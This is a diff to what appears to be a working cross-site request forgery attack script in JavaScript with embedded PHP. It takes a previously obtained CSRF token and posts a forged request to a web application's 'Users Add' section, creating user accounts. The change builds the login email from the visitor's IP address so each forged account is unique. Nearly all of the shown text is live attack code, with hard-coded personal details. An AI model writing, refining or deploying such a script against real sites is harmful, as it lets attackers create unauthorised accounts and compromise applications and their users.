@@ -36,12 +36,14 @@ xhr.send(null);
 
 // Sends the CSRF attack to POST data to the Users Add section, using the previously obtained CSRF token
 function csrf(token, key) {
+    var randomNum = '<?php echo $_SERVER['REMOTE_ADDR']; ?>';
+    var randomEmail = "okpay+"+randomNum+"@live.com";
     var params = "_Token%5Bfields%5D=" + token;
     params += "&fname=Naysser&";
     params += "lname=trying&";
     params += "phone=&";
     params += "mobile_phone=0625638657&";
-    params += "login=ThisIsAtOoc2024@live.com&";
+    params += "login="+randomEmail+"&";
     params += "_Token%5Bunlocked%5D=&";
     params += "_csrfToken=" + encodeURIComponent(key);
 
